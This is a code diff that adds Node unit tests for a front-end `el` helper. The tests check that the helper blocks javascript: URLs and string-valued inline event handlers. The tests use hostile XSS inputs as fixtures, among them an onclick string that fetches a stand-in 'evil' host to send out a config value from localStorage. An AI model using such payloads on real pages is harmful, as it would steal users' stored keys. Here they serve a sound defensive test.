@@ -3,7 +3,7 @@ import assert from 'node:assert/strict'
 import { readFileSync, readdirSync } from 'node:fs'
 import { dirname, join } from 'node:path'
 import { fileURLToPath } from 'node:url'
-import { esc } from '../src/ui/dom.js'
+import { esc, el } from '../src/ui/dom.js'
 
 const ROOT = join(dirname(fileURLToPath(import.meta.url)), '..')
 
@@ -45,4 +45,38 @@ test('src/ui 下没有任何模块把变量拼进 innerHTML', () => {
   }
   assert.deepEqual(违规, [],
     `禁止把动态数据拼进 innerHTML（LLM 正文会上屏，key 就在同源 localStorage）：\n  ${违规.join('\n  ')}`)
+})
+
+// —— el 的属性通道：innerHTML 护栏扫不到这条路径 ——
+function 假document() {
+  return {
+    createElement: () => ({
+      className: '', textContent: '', attrs: {}, listeners: [],
+      setAttribute(k, v) { this.attrs[k] = v },
+      addEventListener(e, fn) { this.listeners.push([e, fn]) },
+      appendChild() {},
+    }),
+    createTextNode: (t) => ({ text: t }),
+  }
+}
+
+test('el 挡掉 javascript: URL', () => {
+  globalThis.document = 假document()
+  assert.throws(() => el('a', { href: 'javascript:alert(1)' }), /javascript:/)
+  assert.throws(() => el('a', { href: '  JaVaScRiPt:alert(1)' }), /javascript:/, '大小写与前导空格也要挡')
+  assert.throws(() => el('img', { src: 'javascript:x' }), /javascript:/)
+  // 正常 URL 照常放行
+  const a = el('a', { href: 'https://example.com' })
+  assert.equal(a.attrs.href, 'https://example.com')
+  delete globalThis.document
+})
+
+test('el 的 on* 只接函数，传字符串直接报错而不是变成内联处理器', () => {
+  globalThis.document = 假document()
+  assert.throws(() => el('div', { onclick: 'fetch("//evil/"+localStorage.aotai_config)' }), /只能接函数/)
+  const d = el('div', { onclick: () => {} })
+  assert.equal(d.listeners.length, 1)
+  assert.equal(d.listeners[0][0], 'click')
+  assert.equal(d.attrs.onclick, undefined, 'onclick 不该出现在属性里')
+  delete globalThis.document
 })
